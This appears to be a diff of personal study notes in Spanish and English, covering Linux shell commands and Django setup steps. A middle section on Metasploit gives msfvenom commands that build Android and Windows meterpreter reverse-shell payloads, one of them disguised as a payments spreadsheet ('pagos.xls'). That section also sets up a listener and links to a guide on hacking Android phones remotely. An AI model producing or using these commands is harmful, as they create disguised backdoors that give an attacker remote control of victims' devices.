@@ -93,9 +93,11 @@ uname -i
 cd
 ls --file-type
 ls --file-type -a -l
+ls -a -l -R => busqueda recursiva y con informacion completa
+cat,less XXXXX.XXX => Para abir archivos
+rm -d dirname => To remove one or more empty directories use the -d option
+sudo rm -rvi app/ => If you want rm to ask you to confirm before deleting every directories and files
 
-Para abir archivos
-cat,less XXXXX.XXX
 
 Para seleccionar la impresion de una linea segun string d euna linea se ocupa grep, ej: ifconfig | grep broadcast
 Para seleccionar una posicion de esa linea se utiliza awk {print$2}
@@ -229,42 +231,50 @@ https://www.androidgigs.com/how-to-hack-android-phone-remotely/
 
 https://www.androidgigs.com/how-to-hack-android-phone-remotely/
 
-## Instalando el metasploit
+# Instalando el metasploit
 sudo apt-get install metasploit-framework
+
 msfvenom -h
+
 gem install bundle
+
 bundle install
+
 gem update --system
+
 msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.91 LPORT=4444 -o payloadname.apk  => Creando el payload
+
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.91 LPORT=4444 -o pagos.xls => otro payload
 
-## En otra consola
+# En otra consola
+
 msfconsole => Se corre en otra consola
+
 use exploit/multi/handler
+
 set LHOST 192.168.1.91
 
 
 
-
-
-
-
-
-
-
-
-
-
-
+# Celery
 1)	“django-admin.py startproject src”. Para comenzar haciendo la carpeta de configuración
+
 2)	Para el proyecto se debe crear base de datos, q por omision en django funciona con SQL.
+
 3)	Para crear base de datos. “python manage.py migrate”
+
 4)	Django tiene un servidor de prueba, para turn on se debe escribir “python manage.py runserver”
+
 5)	Una vez iniciado el servidor, da el ip y puerto.
+
 6)	Crear primera vista y confgurar el URL
+
 7)	Se arregla el 
+
 8)	Peticion => Request, crea objeto HTTP Request, asociado a la función vista
+
 9)	Respuesta => HTTPResponse
+
 10)	url.py genera listado de URL a ser vistas, se genera dentro de la tupla. Aquí se generan las rutas
 
 
